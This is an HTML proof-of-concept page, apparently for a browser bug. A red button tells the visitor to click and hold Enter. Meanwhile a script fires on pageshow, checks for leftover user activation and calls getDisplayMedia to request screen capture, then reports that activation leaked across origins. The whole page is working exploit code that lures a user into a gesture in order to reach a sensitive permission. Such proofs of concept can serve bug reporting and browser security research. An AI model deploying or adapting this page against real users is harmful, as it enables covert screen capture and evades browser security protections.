<!DOCTYPE html>
<html>

<body style="background: #fff5f5; font-family: sans-serif; text-align: center; padding: 50px;">

    <button id="main-exploit-btn"
        style="margin-top: 30px; padding: 5px 5px; font-size: 24px; cursor: pointer; background: #ff4444; color: white; border: none; border-radius: 12px; font-weight: bold; transition: all 0.3s ease;">
        click and hold 2s
    </button>

    <div id="instruction-box"
        style="margin-top: 30px; border: 2px dashed #ff4444; padding: 20px; background: white; max-width: 500px; margin-left: auto; margin-right: auto;">
        <p id="step-text"><b>Step 1:</b> Click and <b>HOLD "Enter"</b> on the red button above.</p>
    </div>

    <script>
        let triggered = false;
        function tryExploit() {
            const isActive = navigator.userActivation.isActive;
            console.log("[*] Checking activation:", isActive);
            if (isActive && !triggered) {
                triggered = true;
                navigator.mediaDevices.getDisplayMedia({ video: true })
                    .then(() => {
                        alert("EXPLOIT SUCCESS:\n\nUser Activation leaked across origins.");
                    })
                    .catch(e => {
                        console.log("Blocked:", e.message);
                        triggered = false;
                    });
            }
        }
        window.addEventListener("pageshow", () => {
            setTimeout(tryExploit, 50);
            setTimeout(tryExploit, 150);
            setTimeout(tryExploit, 300);
        });
    </script>
</body>

</html>
